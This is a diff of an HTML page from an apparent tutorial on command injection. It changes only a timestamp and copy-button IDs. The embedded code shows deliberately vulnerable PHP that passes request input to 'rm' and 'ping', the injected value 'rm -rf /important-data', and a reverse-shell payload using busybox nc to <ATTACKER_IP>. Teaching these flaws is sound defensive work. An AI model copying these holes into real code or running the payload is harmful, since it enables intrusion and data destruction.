@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:12 -->
+<!-- 2026-07-30 Thu 22:21 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Command Injection</title>
@@ -967,11 +967,11 @@ Here are several illustrative examples of how command injection can occur:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_af0df9bdfc674f4b99ff89a617c142b1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_3afdd26a4bc34723aa5315b51c318c0e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1=document.querySelector('button[name=btn_af0df9bdfc674f4b99ff89a617c142b1]');
-copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<?php\nprint(\"Please specify the name of the file to delete\");\nprint(\"<p>\");\n$file=$_GET['filename'];\nsystem(\"rm $file\"); // 'rm' is a command to delete files\n?>\n`);copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_af0df9bdfc674f4b99ff89a617c142b1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3afdd26a4bc34723aa5315b51c318c0e=document.querySelector('button[name=btn_3afdd26a4bc34723aa5315b51c318c0e]');
+copyBtnbtn_3afdd26a4bc34723aa5315b51c318c0e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<?php\nprint(\"Please specify the name of the file to delete\");\nprint(\"<p>\");\n$file=$_GET['filename'];\nsystem(\"rm $file\"); // 'rm' is a command to delete files\n?>\n`);copyBtnbtn_3afdd26a4bc34723aa5315b51c318c0e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3afdd26a4bc34723aa5315b51c318c0e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -997,11 +997,11 @@ In this example, if a user provides <code>image.jpg; rm -rf /important-data</cod
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_ec13a4438f4346db8d15f60f7e8336ef>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>PHP</span><button class='copyBtn' name=btn_0949d7b4aeba469bbdfa9423fb6c3997>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef=document.querySelector('button[name=btn_ec13a4438f4346db8d15f60f7e8336ef]');
-copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`<?php\n$ip_address = $_GET[\"ip_address\"];\n$not_used = array();\n$return_code = 0;\nexec('ping -W 2 -c 1 ' . $ip_address, $not_used, $return_code);\n?>\n`);copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ec13a4438f4346db8d15f60f7e8336ef.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0949d7b4aeba469bbdfa9423fb6c3997=document.querySelector('button[name=btn_0949d7b4aeba469bbdfa9423fb6c3997]');
+copyBtnbtn_0949d7b4aeba469bbdfa9423fb6c3997.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<?php\n$ip_address = $_GET[\"ip_address\"];\n$not_used = array();\n$return_code = 0;\nexec('ping -W 2 -c 1 ' . $ip_address, $not_used, $return_code);\n?>\n`);copyBtnbtn_0949d7b4aeba469bbdfa9423fb6c3997.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0949d7b4aeba469bbdfa9423fb6c3997.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1078,11 +1078,11 @@ Once execution was confirmed, a pre-installed BusyBox netcat binary on the targe
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7f79de58ea4449bd98d0f546cd084638>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_cf7aa6eb9c804e82b7791ea0d16fc8ac>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7f79de58ea4449bd98d0f546cd084638=document.querySelector('button[name=btn_7f79de58ea4449bd98d0f546cd084638]');
-copyBtnbtn_7f79de58ea4449bd98d0f546cd084638.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# attack machine — listener\nnc -lvnp <PORT>\n\n# injected payload (conceptual — newline separates ping arg from injected command)\n<ping_target>\nbusybox nc <ATTACKER_IP> <PORT> -e /bin/sh\n`);copyBtnbtn_7f79de58ea4449bd98d0f546cd084638.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7f79de58ea4449bd98d0f546cd084638.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_cf7aa6eb9c804e82b7791ea0d16fc8ac=document.querySelector('button[name=btn_cf7aa6eb9c804e82b7791ea0d16fc8ac]');
+copyBtnbtn_cf7aa6eb9c804e82b7791ea0d16fc8ac.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# attack machine — listener\nnc -lvnp <PORT>\n\n# injected payload (conceptual — newline separates ping arg from injected command)\n<ping_target>\nbusybox nc <ATTACKER_IP> <PORT> -e /bin/sh\n`);copyBtnbtn_cf7aa6eb9c804e82b7791ea0d16fc8ac.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cf7aa6eb9c804e82b7791ea0d16fc8ac.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
